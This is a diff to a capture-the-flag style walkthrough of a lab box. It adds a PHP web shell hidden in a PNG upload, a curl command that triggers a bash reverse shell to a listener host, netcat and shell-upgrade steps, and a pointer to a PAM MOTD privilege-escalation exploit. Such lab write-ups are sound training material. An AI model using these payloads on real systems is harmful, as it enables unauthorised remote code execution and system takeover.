@@ -35,7 +35,11 @@ gobuster dir -u http://10.10.10.6 -w /usr/share/wordlists/dirbuster/directory-li
 - 2. Content-Type header (this filter works on the server)
 - 3. magic bytes (did not work)
 
-so just change the http header
+so just change the http header,
+add the php code before a png content in Burpsuite.
+```php
+<?php system($_REQUEST["cmd"]);?>
+```
 
 #### upload
 cmd.php seems to be rename as its hash value, as 0ba973670d943861fb9453eecefd3bf7d3054713.php.
@@ -43,3 +47,28 @@ cmd.php seems to be rename as its hash value, as 0ba973670d943861fb9453eecefd3bf
 #### execute
 ``` curl http://10.10.10.6/torrent/upload/0ba973670d943861fb9453eecefd3bf7d3054713.php?cmd=id ```
 
+## reverse shell
+webshell
+```bash
+curl http://10.10.10.6/torrent/upload/0ba973670d943861fb9453eecefd3bf7d3054713.php --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.14/443 0>&1'"
+```
+attacker
+```bash
+nc -lnvp 443
+```
+upgrade the shell
+``` bash
+python -c 'import pty;pty.spawn("bash")'
+^Z
+stty raw -echo
+fg
+```
+
+## privesc
+at user`s file
+``` find . -type f -ls ```
+``` /.cache/motd.legal-displayed ``` looks interesting.
+- Googling for “motd.legal-displayed privesc”
+- https://www.exploit-db.com/exploits/14339
+- Linux PAM 1.1.0 (Ubuntu 9.10/10.04) - MOTD File Tampering Privilege Escalation
+- 
